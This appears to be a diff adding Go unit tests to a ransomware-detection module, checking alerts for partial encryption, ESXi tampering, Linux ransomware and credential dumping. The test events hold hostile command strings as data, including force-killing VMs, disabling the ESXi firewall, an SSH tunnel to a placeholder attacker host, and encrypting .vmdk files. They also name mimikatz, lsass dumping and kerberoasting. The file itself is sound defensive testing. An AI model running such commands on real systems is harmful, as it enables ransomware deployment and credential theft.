@@ -46,6 +46,17 @@ func (cp *capturingPipeline) alertTitles() []string {
 	return titles
 }
 
+func (cp *capturingPipeline) hasAlertType(alertType string) bool {
+	cp.mu.Lock()
+	defer cp.mu.Unlock()
+	for _, a := range cp.alerts {
+		if a.Type == alertType {
+			return true
+		}
+	}
+	return false
+}
+
 func startedModule(t *testing.T) *Interceptor {
 	t.Helper()
 	i := New()
@@ -725,3 +736,276 @@ var _ core.Module = (*Interceptor)(nil)
 
 // Suppress unused import
 var _ = math.Log2
+
+// ===========================================================================
+// 2025-2026: Intermittent/Partial Encryption Detection Tests
+// ===========================================================================
+
+func TestInterceptor_HandleEvent_IntermittentEncryption(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "file_modified", core.SeverityInfo, "file modified")
+	ev.Details["path"] = "/data/important.docx"
+	ev.Details["process_name"] = "encrypt.exe"
+	ev.Details["partial_encryption"] = "true"
+	ev.Details["bytes_encrypted"] = 4096
+	ev.Details["file_size"] = 1048576
+	ev.Details["encryption_pattern"] = "first_bytes"
+	ev.SourceIP = "10.0.0.50"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("intermittent_encryption") {
+		t.Error("expected intermittent_encryption alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_IntermittentEncryption_ByteRatio(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "file_modified", core.SeverityInfo, "file modified")
+	ev.Details["path"] = "/data/database.sql"
+	ev.Details["process_name"] = "ransom"
+	ev.Details["bytes_encrypted"] = 512
+	ev.Details["file_size"] = 10240
+	ev.SourceIP = "10.0.0.51"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("intermittent_encryption") {
+		t.Error("expected intermittent_encryption alert from byte ratio detection")
+	}
+}
+
+// ===========================================================================
+// 2025-2026: ESXi/Hypervisor Ransomware Detection Tests
+// ===========================================================================
+
+func TestInterceptor_HandleEvent_ESXiCommand(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "process_execution", core.SeverityInfo, "process exec")
+	ev.Details["command_line"] = "esxcli vm process kill --type=force --world-id=12345"
+	ev.Details["process_name"] = "esxcli"
+	ev.SourceIP = "10.0.0.60"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("esxi_ransomware") {
+		t.Error("expected esxi_ransomware alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_VMEncryption(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "vm_encryption", core.SeverityInfo, "vm encryption")
+	ev.Details["vm_name"] = "prod-db-01"
+	ev.Details["datastore"] = "datastore1"
+	ev.Details["process_name"] = "encrypt"
+	ev.Details["vm_count"] = 5
+	ev.SourceIP = "10.0.0.61"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("vm_encryption") {
+		t.Error("expected vm_encryption alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_ESXiSSHTunnel(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "esxi_command", core.SeverityInfo, "esxi command")
+	ev.Details["command_line"] = "ssh -D 1080 attacker@c2server.com"
+	ev.Details["action"] = "ssh_tunnel"
+	ev.SourceIP = "10.0.0.62"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("esxi_ssh_tunnel") {
+		t.Error("expected esxi_ssh_tunnel alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_ESXiConfigTamper(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "hypervisor_activity", core.SeverityInfo, "hypervisor")
+	ev.Details["action"] = "firewall_disable"
+	ev.Details["command_line"] = "esxcli network firewall set --enabled false"
+	ev.SourceIP = "10.0.0.63"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("esxi_config_tamper") {
+		t.Error("expected esxi_config_tamper alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_VMPowerOff(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "hypervisor_activity", core.SeverityInfo, "hypervisor")
+	ev.Details["action"] = "power_off"
+	ev.Details["vm_name"] = "prod-web-01"
+	ev.Details["process_name"] = "vim-cmd"
+	ev.Details["vm_count"] = 8
+	ev.SourceIP = "10.0.0.64"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("vm_power_off") {
+		t.Error("expected vm_power_off alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_VMSnapshotDelete(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "hypervisor_activity", core.SeverityInfo, "hypervisor")
+	ev.Details["action"] = "snapshot_delete"
+	ev.Details["vm_name"] = "prod-db-01"
+	ev.SourceIP = "10.0.0.65"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("vm_snapshot_delete") {
+		t.Error("expected vm_snapshot_delete alert")
+	}
+}
+
+// ===========================================================================
+// 2025-2026: Linux Ransomware Detection Tests
+// ===========================================================================
+
+func TestInterceptor_HandleEvent_LinuxRansomware(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "process_execution", core.SeverityInfo, "process exec")
+	ev.Details["command_line"] = "find / -name *.vmdk -exec encrypt {} \\;"
+	ev.Details["process_name"] = "find"
+	ev.SourceIP = "10.0.0.70"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("linux_ransomware") {
+		t.Error("expected linux_ransomware alert")
+	}
+}
+
+// ===========================================================================
+// 2025-2026: Pre-Ransomware Credential Harvesting Detection Tests
+// ===========================================================================
+
+func TestInterceptor_HandleEvent_CredentialDump_Mimikatz(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "credential_dump", core.SeverityInfo, "cred dump")
+	ev.Details["tool_name"] = "mimikatz"
+	ev.Details["process_name"] = "mimikatz.exe"
+	ev.Details["target"] = "SAM"
+	ev.SourceIP = "10.0.0.80"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("credential_dump") {
+		t.Error("expected credential_dump alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_LsassAccess(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "credential_access", core.SeverityInfo, "cred access")
+	ev.Details["technique"] = "lsass_dump"
+	ev.Details["process_name"] = "procdump.exe"
+	ev.Details["target"] = "lsass.exe"
+	ev.SourceIP = "10.0.0.81"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("lsass_access") {
+		t.Error("expected lsass_access alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_NTLMHashExtraction(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "credential_dump", core.SeverityInfo, "hash dump")
+	ev.Details["technique"] = "ntlm_dump"
+	ev.Details["process_name"] = "secretsdump.py"
+	ev.Details["target"] = "SAM"
+	ev.SourceIP = "10.0.0.82"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("ntlm_hash_extraction") {
+		t.Error("expected ntlm_hash_extraction alert")
+	}
+}
+
+func TestInterceptor_HandleEvent_KerberosTheft(t *testing.T) {
+	cp := makeCapturingPipeline()
+	mod := startedModuleWithPipeline(t, cp)
+	defer mod.Stop()
+
+	ev := core.NewSecurityEvent("test", "credential_access", core.SeverityInfo, "kerberos")
+	ev.Details["technique"] = "kerberoasting"
+	ev.Details["process_name"] = "rubeus.exe"
+	ev.SourceIP = "10.0.0.83"
+
+	mod.HandleEvent(ev)
+	if !cp.hasAlertType("kerberos_theft") {
+		t.Error("expected kerberos_theft alert")
+	}
+}
+
+// ===========================================================================
+// 2025-2026: New Mitigation Coverage Tests
+// ===========================================================================
+
+func TestGetRansomwareMitigations_IntermittentEncryption(t *testing.T) {
+	m := getRansomwareMitigations("intermittent_encryption")
+	if len(m) < 3 {
+		t.Errorf("expected at least 3 mitigations for intermittent_encryption, got %d", len(m))
+	}
+}
+
+func TestGetRansomwareMitigations_ESXi(t *testing.T) {
+	for _, alertType := range []string{"esxi_ransomware", "vm_encryption", "esxi_ssh_tunnel", "esxi_config_tamper", "vm_power_off", "vm_snapshot_delete"} {
+		m := getRansomwareMitigations(alertType)
+		if len(m) < 3 {
+			t.Errorf("expected at least 3 mitigations for %s, got %d", alertType, len(m))
+		}
+	}
+}
+
+func TestGetRansomwareMitigations_CredentialHarvesting(t *testing.T) {
+	for _, alertType := range []string{"credential_dump", "lsass_access", "ntlm_hash_extraction", "kerberos_theft", "credential_access"} {
+		m := getRansomwareMitigations(alertType)
+		if len(m) < 3 {
+			t.Errorf("expected at least 3 mitigations for %s, got %d", alertType, len(m))
+		}
+	}
+}
+
+func TestGetRansomwareMitigations_LinuxRansomware(t *testing.T) {
+	m := getRansomwareMitigations("linux_ransomware")
+	if len(m) < 3 {
+		t.Errorf("expected at least 3 mitigations for linux_ransomware, got %d", len(m))
+	}
+}
